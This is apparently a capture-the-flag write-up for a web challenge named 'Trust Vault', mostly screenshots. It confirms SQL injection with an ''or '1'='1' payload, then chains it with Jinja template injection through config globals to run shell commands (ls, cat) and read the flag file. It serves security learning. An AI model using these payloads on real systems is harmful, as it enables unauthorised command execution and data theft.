# 🟢 Trust Vault

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

we will register first then login

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

we can already see other people's payload

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

in bookmark i tried SSTI and hint already said jinja rendering so no need to go through the process of finding which Template Engine backend is using

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

in Response i found hidden path

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

when i clicked my SSTI bookmark it showed SQL query

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

i got 2 different result from 2 different payload which confirmed SQLi

```
hello
```

```
hello' or '1'='1
```

now i have to find SSTI

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

SSTI confirmed

<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
hello' or '1'='{{config.items()}}'
```

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

```
hello' or '1'='{{config.__class__.__init__.__globals__["os"].popen("ls").read()}}'
```

```
hello' or '1'='{{config.__class__.__init__.__globals__["os"].popen("ls ../").read()}}'
```

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

```
hello' or '1'='{{config.__class__.__init__.__globals__["os"].popen("cat ../flag-f571a6e6ddc3671df91309cf97e5a624.txt").read()}}'
```
